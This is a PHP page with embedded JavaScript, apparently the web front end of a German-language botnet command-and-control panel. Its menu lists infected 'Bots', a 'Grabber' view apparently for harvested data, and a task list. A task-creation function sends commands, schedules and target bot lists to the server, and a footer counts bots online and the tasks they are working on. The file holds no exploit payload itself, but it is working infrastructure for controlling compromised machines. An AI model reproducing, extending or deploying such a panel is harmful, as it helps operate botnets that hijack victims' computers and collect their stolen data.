<?php
include('login.php');
?>
<head>
<link rel="stylesheet" type="text/css" href="style.css">
<script type="text/javascript">
	
	var lookingAt = 1;
	var cntTimer = 0;
	function refreshStats(){
		var request = false;
		if (window.XMLHttpRequest) {
			request = new XMLHttpRequest(); // Mozilla, Safari, Opera
		} else if (window.ActiveXObject) {
			try {
				request = new ActiveXObject('Msxml2.XMLHTTP'); // IE 5
			} catch (e) {
				try {
					request = new ActiveXObject('Microsoft.XMLHTTP'); // IE 6
				} catch (e) {}
			}
		}
		if (!request) {
			alert("Kann keine XMLHTTP-Instanz erzeugen");
			return false;
		} else {
			request.open('post', 'stats.php', true);
			request.send(null);
			request.onreadystatechange = function() {
				interpretRequest('footer', request);
			};
		}
	}
	function sendRequest(file, element, id){
		var request = false;
		if (window.XMLHttpRequest) {
			request = new XMLHttpRequest(); // Mozilla, Safari, Opera
		} else if (window.ActiveXObject) {
			try {
				request = new ActiveXObject('Msxml2.XMLHTTP'); // IE 5
			} catch (e) {
				try {
					request = new ActiveXObject('Microsoft.XMLHTTP'); // IE 6
				} catch (e) {}
			}
		}
		if (!request) {
			alert("Kann keine XMLHTTP-Instanz erzeugen");
			return false;
		} else {
			request.open('post', file, true);
			request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
			request.send("taskid="+id);
			request.onreadystatechange = function() {
				interpretRequest(element, request);
			};
		}
	}
	function refreshContent(){
		switch(lookingAt){
			case 1:
				sendRequest('listBots.php', 'content');
				break;
			case 2:
				sendRequest('listTask.php', 'content');
				break;
			case 3:
				clearInterval(cntTimer);
				sendRequest('createTask.php', 'content');
				break;	
			case 4:
				clearInterval(cntTimer);
				sendRequest('listGrabbs.php', 'content');
				break;
		}
	}
	function deleteTask(id){
		sendRequest('deleteTask.php', 'content', id);
	}
	function setContent(id){
		clearInterval(cntTimer);
		lookingAt = id;
		refreshContent();
		cntTimer = setInterval('refreshContent()', 30000); //Standart: 2000
	}
	function newTask(pCmdType,pCommand, pStart, pBots, pType, pEnd) {
		var request = false;
		setContent(2);
		if (window.XMLHttpRequest) {
			request = new XMLHttpRequest(); // Mozilla, Safari, Opera
		} else if (window.ActiveXObject) {
			try {
				request = new ActiveXObject('Msxml2.XMLHTTP'); // IE 5
			} catch (e) {
				try {
					request = new ActiveXObject('Microsoft.XMLHTTP'); // IE 6
				} catch (e) {}
			}
		}
		if (!request) {
			alert("Kann keine XMLHTTP-Instanz erzeugen");
			return false;
		} else {
			request.open('post', 'handleCreateTask.php', true);
			request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
			request.send("cmdtype="+pCmdType+"&command="+pCommand+"&type="+pType+"&end="+pEnd+"&start="+pStart+"&bots="+pBots);
			request.onreadystatechange = function() {
				interpretRequest('content', request);
			};
		}
	}
	function interpretRequest(id, request) {
		switch (request.readyState) {
			case 4:
				if (request.status != 200) {
					//alert("Der Request wurde abgeschlossen, ist aber nicht OK\nFehler:"+request.status);
					alert("Verbindung zum Server unterbrochen! Fehler:"+request.status);
				} else {
					var content = request.responseText;
					document.getElementById(id).innerHTML = content;
				}
				break;
			default:
				break;
		}
	}
	refreshStats();
	refreshContent();
	setInterval('refreshStats()', 1000); //Standart: 1000
	cntTimer = setInterval('refreshContent()', 30000); //Standart: 2000
	
</script>
</head>
<body>
<TT>
<div class='centered'>
	<table  cellpadding=0 cellspacing=0 width=100% height=100%>
		<tr>
			<td>
				<div id='header' align=center><br><br><br>
				</div>
			</td>
		</tr>
		<tr height=100%>
			<td>
				<table cellpadding=0 cellspacing=0 height=100%>
					<tr>
						<td>
						
							<div id='menu' align=center><br>
								<a href="javascript:setContent(1)"><img src="img/mBots.png" width="35" height="35" /><br> Bots<br></a><br><br><br>
								<a href="javascript:setContent(4)"><img src="img/mGrabber.png" width="35" height="35" /><br> Grabber<br></a><br><br><br>
								<a href="javascript:setContent(2)"><img src="img/mListTask.png" width="35" height="35" /><br> Task Liste<br></a><br><br><br>
								<a href="javascript:setContent(3)"><img src="img/mAddTask.png" width="35" height="35" /><br> Task erstellen<br></a><br><br><br>
					<br><br><br><br><br><br><br><br>
							</div>
						</td>
						<td >
							<div id='content' align=center>
								
							</div>
						</td>
					</tr>
				</table>
			</td>
		</tr>
		<tr>
			<td>
				<div id='footer' align=center><br>
					00:00:00<br>
					-<br>
					0/0 Bots Online<br>
					-<br>
					0 arbeiten an 0 Tasks
				</div>

			</td>
		</tr>
	</table>
</div>
</TT>
</body>
